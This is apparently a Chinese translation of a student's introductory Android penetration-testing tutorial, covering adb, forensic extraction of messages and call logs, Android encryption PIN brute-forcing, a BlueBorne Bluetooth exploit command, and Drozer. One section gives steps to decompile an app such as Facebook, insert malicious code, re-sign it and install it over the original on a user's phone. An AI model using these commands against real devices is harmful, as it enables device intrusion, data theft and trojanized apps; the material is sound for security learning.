## 背景

**在过去的这个学期里，我报名参加了一个网络安全的课程。在期末考时我们的教授允许我们自己选择测试项目来完成，并作为期末考的成绩而无需再参加期末笔试。我立马抓住了这个机会（呵呵，谁想参加期末考呢？），我希望通过实践来了解更多关于移动安全方面的内容。**

在研究和阅读了相关的技术文档后，我决定自己写一篇教程。这是我人生中的第一篇与移动相关的教程文章，因此它可能并不全面。但我相信分享即是关怀，所以如果你有任何的意见或建议，可以随时与我取得联系。

## Android 架构

在Android架构中有5个层：应用程序，应用程序框架，库，运行时环境和Linux内核层。

应用程序层包含由用户安装的本机应用和第三方应用。应用程序框架层提供管理和控制应用程序层的服务，包括4个组件：活动，内容，服务，通知和广播。库层控制和访问应用程序数据。运行时包括Dalvik
VM，所有java文件都以Dalvik格式（dex）进行转换，以在运行之前进行优化。内核层控制核心服务，如电源控制，安全性，硬件，内存管理等。

## 工具

我们先来下载Santoku。这是一个非常棒的开源虚拟机，专用于移动取证，分析和安全性。其中包含了我使用的所有工具。

\- VM: Santoku （<https://santoku-linux.com/download/>）

## 准备

在开始之前，你需要将手机置于开发者模式，并打开USB调试。设置步骤如下：

> 设置 -> 关于手机 -> 版本号 -> 连击7次 -> 开发者设置模式打开 -> 转到USB调试 -> 启用

现在你可以将手机连接到计算机，并检查是否成功：

    
    
    adb devices -l

![0_wFZit0bYuxF6M6rd.png](https://image.3001.net/images/20190215/1550204980_5c664034cab77.png!small)

一旦成功连接，你应该能够通过以上命令列出该设备。注意设备ID，你可以使用该ID来打开shell。

接下来，打开一个shell：

    
    
    adb -s ce20c6e4 shell

![1_ZTo3rkdESqmJyw2k.png](https://image.3001.net/images/20190215/1550205008_5c664050e51fa.png!small)

现在，你就可以像在Linux环境中一样，例如列出所有文件及其权限：

![2_HKztSFKlAb46WtJN.png](https://image.3001.net/images/20190215/1550205027_5c664063f0563.png!small)

![4_qLENi4lYw7Pktsat.png](https://image.3001.net/images/20190215/1550205047_5c664077a1d6c.png!small)

这里有一篇关于爆破安卓PIN 码的文章：<https://santoku-linux.com/howto/mobile-forensics/how-to-brute-force-android-encryption/>

 **Header**

    
    
    $ adb shell dd if=/dev/block/mmcblk0p2 of=tmp_header bs=512 count=1
    $ adb pull tmp_header ~/Desktop/tmp_header

 **Footer**

    
    
    $ adb shell mkdir /efs
    $ adb shell mount -t yaffs2 /dev/block/mtdblock6 /efs
    $ adb pull /efs/userdata_footer ~/Desktop/tmp_footer

 **爆破 PIN：**

    
    
    $ bruteforce_stdcrypto ~/Desktop/t/tmp_header ~/Desktop/t/tmp_footer

另一件非常有趣的事是启动tcpdump来收集一些数据包，并使用Wireshark来读取流量：

    
    
    adb shell “tcpdump -s 0 -w — | nc -l -p 4444”
    
    
    adb forward tcp:4444 tcp:4444
    
    
    nc localhost 4444 | sudo wireshark -k -S -i

## 移动取证

接下来，我将用到一个在移动取证方面非常棒的工具AFLogical
OSE。如果你想要提取出所有的文件，例如呼叫日志，mms，短信，图片，手机上安装的应用程序，其版本......等，这个工具将能帮到你。

![4_qLENi4lYw7Pktsat.png](https://image.3001.net/images/20190215/1550205077_5c664095e7877.png!small)

导航到取证文件夹可以看到，提取的文件分别被放置在以日期命名的不同文件夹当中：

![5_7u-wLO4_L3wW0y_I.png](https://image.3001.net/images/20190215/1550205098_5c6640aa4192b.png!small)

 **注意：** 这是我测试的Android手机，我只在Defcon期间使用...因此只有3个日期的数据。单击相应的文件夹后你可以看到如下内容：

![6_qv2FQaFd2scMIMJ2.png](https://image.3001.net/images/20190215/1550205117_5c6640bd48da6.png!small)

我们双击打开一个csv文件内容如下：

![7_EKTChrxYaFjSy3Jb.png](https://image.3001.net/images/20190215/1550205140_5c6640d4c5b76.png!small)

以及打开info.xml文件，如下所示：

![8_bSj2wfOwmDayUTFN.png](https://image.3001.net/images/20190215/1550205158_5c6640e624689.png!small)

有趣的还在后头：

\- 使用Blueborne解决手机的蓝牙问题（详情请参阅：<https://armis.com/blueborne/>）

    
    
    $ sudo apt-get install libbluetooth-dev
    $sudo pip2 install pybluez pwn scapy

要运行漏洞利用程序，此存储库的根目录必须位于PYTHONPATH中。

    
    
    $ export PYTHONPATH=$PYTHONPATH:<repo-path>
    $ sudo python2 doit.py hci0 <target-bdaddr> <attacker-ip>

## 逆向一个 APK

在Android手机上对应用进行逆向实际上非常的容易。所需的工具及步骤如下：

 **工具**

> USB Debugger
>
> Dex2jar
>
> JD-Gui

 **步骤**

> 从手机中提取的info.xml列表中下载应用程序
>
> 将应用程序反编译为.java文件
>
> 插入恶意代码并确保它可以运行
>
> 签名最终的apk文件
>
> 在用户手机上安装apk文件 - 替换原始应用程序

APK是一个压缩包，包含开发人员编译的证书，文件，清单，资源和dex代码。要获取应用程序的apk，你只需简单的网络搜索即可。

![9_Gb_OrCosL-q4WgbF.png](https://image.3001.net/images/20190215/1550205198_5c66410e40069.png!small)

示例下载：Facebook（57.2mb），Skype（~30.7mb）和Twitter（29.8mb）。这里我将以Facebook apk文件为例。

首先，使用dex2jar来提取apk。之后，该工具会将所有新的.dex apk转换后的文件保存到.jar文件中。

![10_txPhUEbxuoPu0ZSr.png](https://image.3001.net/images/20190215/1550205224_5c664128091bc.png!small)

文件夹中的内容如下：

![11_EzHwuwfyn1b_Qu_v.png](https://image.3001.net/images/20190215/1550205243_5c66413b8ad12.png!small)

要查看jar文件的源码，需要用到一个名为JD-GUI的工具。JD-GUI是一个Java反编译工具。现在，我们可以看到来自Facebook的所有声明的函数和源码。此时，所有文件都是可读和可修改的：

![12_9Dd-AKCzydtVJRYP.png](https://image.3001.net/images/20190215/1550205264_5c664150953bf.png!small)

对于那些想要尝试将一些代码添加到应用程序并重新打包的人，以下是一个很好的例子：

    
    
    $ adb connect 10.0.2.5
    $ adb pull /system/framework/framework-res.apk 
    $ apktool if framework-res.apk
    $ apktool d -r 你新的app名称.apk # 安装你的app

Open打开 - 修改现有的smali文件并创建恶意代码放到smali/com文件夹中。然后使用apktool重新打包b -f [app之前的名称]（ -f覆盖现有文件）

 **创建一个用于签名 apk 文件的密钥：**

    
    
    keytool -alias am -genkey -v -keystore my-release-key.keystore-keyalg RSA -keysize 2048 -validity 10000

 **签名 apk 文件：**

    
    
    $ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1-keystore my-releasekey.keystore [your-old-app-name].apk 
    [$ jarsigner -keystore debug.keystore -sigalg SHA1withRSA test.apk androiddebugkey
    $ jarsigner -keystore debug.keystore -verify -verbose -certs test.apk]

安装新apk文件：

    
    
    $ adb install [你的app名称].apk

## 漏洞查找

接下来，最后我们将用到一个名为Drozer的工具（<https://github.com/mwrlabs/drozer>）。

 **Drozer 简介**

Drozer是MWR
Labs开发的一款Android安全测试框架，是目前最好的Android安全测试工具之一。它允许你以一个普通android应用的身份与其他应用和操作系统交互。在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。

 **Drozer 安装**

    
    
    $ adb install drozer-agent.apk

接下来，由于Drozer默认运行在31415端口上，我们可以将当前的adb端口转发到默认的Drozer端口。

    
    
    $ adb forward tcp:31415 tcp:31415
    Start a drozer session over default port 31415:
    $ drozer console connect

成功连接后应该会显示一个小的Android图标和运行界面在你的手机上。

一些你可能会用到的Drozer命令：list，shell，clean，load，module，unset，set，shell，run MODULE。

例如，检索所有包列表的信息：

    
    
    dz> run app.package.list

确定一个攻击面（用你的应用程序名替换）：

    
    
    dz> run app.package.attacksurface sie571.sie571

最后，我为大家找了一些有关使用Drozer进行app渗透测试的技术文章。如果你对此感兴趣，建议你花些时间来阅读它们。

> <https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet>
>
>
> <https://www.tutorialspoint.com/android_penetration_testing/android_penetration_testing_overview.asp>
>
> <https://learn.techbeacon.com/units/how-get-started-mobile-penetration-> testing-android>
>
> <https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide>
>
>
> <https://go.armis.com/hubfs/BlueBorne%20-%20Android%20Exploit%20(20171130).pdf?t=1541104049654>
>
> <https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-> guide-2015-03-23.pdf>
>
> <https://resources.infosecinstitute.com/android-penetration-tools-> walkthrough-series-drozer/#gref>

 ***参考来源：[usejournal](https://blog.usejournal.com/an-intro-to-pentesting-an-android-phone-464ec4860f39)，FB小编secist编译，转载请注明来自FreeBuf.COM **  

